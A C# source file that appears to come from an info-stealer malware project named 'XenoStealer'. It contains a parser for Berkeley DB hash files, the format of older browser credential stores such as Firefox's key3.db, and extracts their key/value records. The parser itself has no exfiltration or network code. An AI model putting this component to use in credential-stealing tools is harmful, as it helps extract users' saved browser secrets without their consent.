using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace XenoStealer.DataExtraction.Parsers
{
    public class BerkelyParser
    {
        public static KeyValuePair<string, byte[]>[] Parse(byte[] fileBytes) 
        {
            List<KeyValuePair<string, byte[]>> parsedData = new List<KeyValuePair<string, byte[]>>();

            uint magic = ReadUIntBigEndian(fileBytes, 0);

            if (magic != 398689)
            {
                return null;
            }

            int pageSize = (int)ReadUIntBigEndian(fileBytes, 12);

            int NumberOfKeys = (int)ReadUIntBigEndian(fileBytes, 0x38);

            int page = 1;

            while (parsedData.Count < NumberOfKeys) 
            {
                int addrCount = ((int)NumberOfKeys-parsedData.Count) * 2;
                ushort[] addresses = new ushort[addrCount];

                for (int i = 0; i < addrCount; i++)
                {
                    addresses[i] = BitConverter.ToUInt16(fileBytes, (pageSize * page) + 2 + (i * 2));
                }

                Array.Sort(addresses);

                for (int i = 0; i < addresses.Length; i += 2)
                {
                    int startValue = addresses[i] + (pageSize * page);
                    int startKey = addresses[i + 1] + (pageSize * page);
                    int end = ((i + 2) >= addresses.Length) ? pageSize + pageSize * page : addresses[i + 2] + pageSize * page;

                    string key = Encoding.Default.GetString(fileBytes, startKey, end - startKey);
                    byte[] value = fileBytes.Skip(startValue).Take(startKey - startValue).ToArray();

                    if (!string.IsNullOrWhiteSpace(key))
                    {
                        parsedData.Add(new KeyValuePair<string, byte[]>(key, value));
                    }

                }


                page++;
            }


            return parsedData.ToArray();
        }

        private static uint ReadUIntBigEndian(byte[] buffer, int offset)
        {
            return (uint)((buffer[offset] << 24) | (buffer[offset + 1] << 16) | (buffer[offset + 2] << 8) | buffer[offset + 3]);
        }

    }
}
